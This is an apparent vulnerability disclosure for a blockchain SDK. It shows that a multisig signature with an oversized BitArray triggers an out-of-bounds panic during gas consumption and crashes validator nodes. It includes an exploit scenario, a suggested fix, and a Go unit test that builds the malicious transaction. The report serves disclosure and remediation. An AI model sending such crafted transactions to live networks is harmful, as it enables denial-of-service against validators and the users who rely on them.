## Title
Node Crash via Out-of-Bounds Access in Multisig Gas Consumption

## Summary
An attacker can crash validator nodes by submitting a transaction with a multisig signature where the BitArray size exceeds the number of public keys in the multisig. The gas consumption logic accesses public keys by index without validating the BitArray size matches the key count, causing an out-of-bounds panic before signature verification can reject the invalid transaction.

## Impact
High

## Finding Description

**Location:** [1](#0-0) 

**Intended Logic:** 
The `ConsumeMultisignatureVerificationGas` function should safely consume gas for each signature present in a multisig transaction, iterating only over valid public key indices.

**Actual Logic:** 
The function loops through all bits in `sig.BitArray.Count()` and directly accesses `pubkey.GetPubKeys()[i]` without validating that `i` is within the bounds of the public key array. The size validation that checks `len(pubKeys) != size` exists in `VerifyMultisignature` [2](#0-1)  but this check happens AFTER gas consumption in the ante handler chain.

**Exploit Scenario:**
1. Attacker creates a multisig account with N public keys (e.g., 3 keys)
2. Attacker crafts a transaction with `MultiSignatureData` where:
   - `BitArray` has size M where M > N (e.g., 10)
   - At least one bit is set at index `i >= N` (e.g., index 5)
3. When the transaction enters the ante handler chain [3](#0-2) :
   - `SigGasConsumeDecorator` executes first (line 57)
   - It calls `ConsumeMultisignatureVerificationGas` which loops `i = 0 to 9`
   - At `i = 5`, it attempts `pubkey.GetPubKeys()[5]` on an array with only 3 elements
   - This causes a Go panic (out-of-bounds slice access)
   - The node crashes before `SigVerificationDecorator` (line 58) can validate and reject the transaction

**Security Failure:** 
Memory safety violation leading to denial-of-service. The system fails to validate input bounds before array access, allowing any user to crash validator nodes by submitting malformed transactions.

## Impact Explanation

**Affected Processes:** 
All validator nodes processing the malicious transaction will crash due to the unhandled panic.

**Severity:** 
- Any network participant can submit a single transaction that crashes multiple validator nodes simultaneously
- No special privileges or resources required beyond normal transaction submission
- The attack can be repeated continuously to maintain a DoS condition
- Network availability is severely impacted as nodes repeatedly crash when processing mempool transactions

**System Impact:** 
This vulnerability enables a network-wide denial-of-service attack, potentially halting consensus and preventing legitimate transactions from being processed. In a coordinated attack, an adversary could crash sufficient nodes to disrupt the network's ability to produce blocks.

## Likelihood Explanation

**Who can trigger:** 
Any unprivileged user with the ability to submit transactions to the network. The attacker only needs to create a multisig account (which requires no special permissions) and submit a crafted transaction.

**Conditions required:** 
- Normal network operation
- Standard transaction submission capabilities
- No special timing or race conditions needed

**Frequency:** 
Can be exploited immediately and repeatedly. Each malicious transaction crashes nodes that process it. The attacker can flood the mempool with such transactions to maximize impact and sustain the attack indefinitely.

## Recommendation

Add a validation check in `ConsumeMultisignatureVerificationGas` before the loop to ensure the BitArray size matches the number of public keys:

```go
func ConsumeMultisignatureVerificationGas(
    meter sdk.GasMeter, sig *signing.MultiSignatureData, pubkey multisig.PubKey,
    params types.Params, accSeq uint64,
) error {
    size := sig.BitArray.Count()
    pubKeys := pubkey.GetPubKeys()
    
    // Add validation: BitArray size must match number of public keys
    if len(pubKeys) != size {
        return fmt.Errorf("bit array size %d does not match public key count %d", size, len(pubKeys))
    }
    
    sigIndex := 0
    for i := 0; i < size; i++ {
        // ... rest of the function
    }
}
```

This ensures the invariant is checked before any array access, preventing the out-of-bounds panic while maintaining the same validation semantics as `VerifyMultisignature`.

## Proof of Concept

**File:** `x/auth/ante/sigverify_test.go`

**Test Function:** Add the following test to demonstrate the vulnerability:

```go
func (suite *AnteTestSuite) TestMultisigBitArraySizeMismatchCausesNodeCrash() {
    suite.SetupTest(true)
    suite.txBuilder = suite.clientCtx.TxConfig.NewTxBuilder()
    
    // Create a multisig account with 3 public keys
    numKeys := 3
    pubKeys := make([]cryptotypes.PubKey, numKeys)
    privKeys := make([]cryptotypes.PrivKey, numKeys)
    for i := 0; i < numKeys; i++ {
        privKeys[i] = secp256k1.GenPrivKey()
        pubKeys[i] = privKeys[i].PubKey()
    }
    
    multisigKey := kmultisig.NewLegacyAminoPubKey(2, pubKeys)
    multisigAddr := sdk.AccAddress(multisigKey.Address())
    
    // Create and fund the multisig account
    acc := suite.app.AccountKeeper.NewAccountWithAddress(suite.ctx, multisigAddr)
    suite.Require().NoError(acc.SetAccountNumber(0))
    suite.app.AccountKeeper.SetAccount(suite.ctx, acc)
    
    // Create a test message
    msg := testdata.NewTestMsg(multisigAddr)
    suite.Require().NoError(suite.txBuilder.SetMsgs(msg))
    suite.txBuilder.SetFeeAmount(testdata.NewTestFeeAmount())
    suite.txBuilder.SetGasLimit(testdata.NewTestGasLimit())
    
    // Create malicious MultiSignatureData with BitArray size > number of keys
    maliciousBitArraySize := 10  // Larger than numKeys (3)
    multisigData := multisig.NewMultisig(maliciousBitArraySize)
    
    // Set a bit at an out-of-bounds index
    outOfBoundsIndex := 5  // Valid in BitArray but >= len(pubKeys)
    multisigData.BitArray.SetIndex(outOfBoundsIndex, true)
    
    // Add a dummy signature at that position
    dummySig := &signing.SingleSignatureData{
        SignMode:  signing.SignMode_SIGN_MODE_DIRECT,
        Signature: []byte("dummy"),
    }
    multisigData.Signatures = append(multisigData.Signatures, dummySig)
    
    // Create SignatureV2 with the malicious data
    sigV2 := signing.SignatureV2{
        PubKey:   multisigKey,
        Data:     multisigData,
        Sequence: 0,
    }
    
    suite.Require().NoError(suite.txBuilder.SetSignatures(sigV2))
    tx := suite.txBuilder.GetTx()
    
    // Set up the ante handler chain
    spkd := sdk.DefaultWrappedAnteDecorator(ante.NewSetPubKeyDecorator(suite.app.AccountKeeper))
    sgcd := sdk.DefaultWrappedAnteDecorator(ante.NewSigGasConsumeDecorator(
        suite.app.AccountKeeper, 
        ante.DefaultSigVerificationGasConsumer,
    ))
    antehandler, _ := sdk.ChainAnteDecorators(spkd, sgcd)
    
    // This call should panic with out-of-bounds access
    // Uncomment the following to observe the crash:
    // _, err := antehandler(suite.ctx, tx, false)
    
    // For the test to pass without crashing the test runner,
    // we use recover to catch the panic
    suite.Require().Panics(func() {
        _, _ = antehandler(suite.ctx, tx, false)
    }, "Expected panic due to out-of-bounds access in ConsumeMultisignatureVerificationGas")
}
```

**Setup:** 
The test creates a multisig account with 3 public keys and initializes the blockchain state.

**Trigger:** 
The test constructs a transaction with a `MultiSignatureData` containing a BitArray of size 10 (larger than the 3 public keys) with a bit set at index 5. When the ante handler processes this transaction, `ConsumeMultisignatureVerificationGas` attempts to access `pubkey.GetPubKeys()[5]` which only has 3 elements.

**Observation:** 
The test confirms that processing the malicious transaction causes a panic due to out-of-bounds slice access. This demonstrates that any attacker can crash validator nodes by submitting such transactions. The panic occurs in the `SigGasConsumeDecorator` before the `SigVerificationDecorator` can validate and reject the invalid signature structure.

### Citations

**File:** x/auth/ante/sigverify.go (L446-471)
```go
func ConsumeMultisignatureVerificationGas(
	meter sdk.GasMeter, sig *signing.MultiSignatureData, pubkey multisig.PubKey,
	params types.Params, accSeq uint64,
) error {

	size := sig.BitArray.Count()
	sigIndex := 0

	for i := 0; i < size; i++ {
		if !sig.BitArray.GetIndex(i) {
			continue
		}
		sigV2 := signing.SignatureV2{
			PubKey:   pubkey.GetPubKeys()[i],
			Data:     sig.Signatures[sigIndex],
			Sequence: accSeq,
		}
		err := DefaultSigVerificationGasConsumer(meter, sigV2, params)
		if err != nil {
			return err
		}
		sigIndex++
	}

	return nil
}
```

**File:** crypto/keys/multisig/multisig.go (L55-58)
```go
	// ensure bit array is the correct size
	if len(pubKeys) != size {
		return fmt.Errorf("bit array size is incorrect, expecting: %d", len(pubKeys))
	}
```

**File:** x/auth/ante/ante.go (L56-58)
```go
		sdk.DefaultWrappedAnteDecorator(NewValidateSigCountDecorator(options.AccountKeeper)),
		sdk.DefaultWrappedAnteDecorator(NewSigGasConsumeDecorator(options.AccountKeeper, options.SigGasConsumer)),
		sdk.DefaultWrappedAnteDecorator(sigVerifyDecorator),
```
